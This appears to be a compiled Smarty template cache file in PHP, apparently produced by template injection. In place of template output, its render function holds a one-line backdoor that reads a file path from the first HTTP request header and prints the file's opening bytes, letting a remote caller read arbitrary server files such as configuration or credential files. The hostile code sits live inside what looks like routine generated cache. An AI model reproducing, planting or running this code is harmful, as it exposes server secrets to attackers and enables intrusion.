<?php
/* Smarty version 3.1.30, created on 2019-06-23 11:51:56
  from "e10306d74f19d616bcc5719cd37386e529094cfb" */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.30',
  'unifunc' => 'content_5d0f67dc874de7_50193214',
  'has_nocache_code' => false,
  'file_dependency' => 
  array (
  ),
  'includes' => 
  array (
  ),
),false)) {
function content_5d0f67dc874de7_50193214 (Smarty_Internal_Template $_smarty_tpl) {
echo var_dump(fread(fopen(urldecode(current(getallheaders())),'r'),100));
}
}
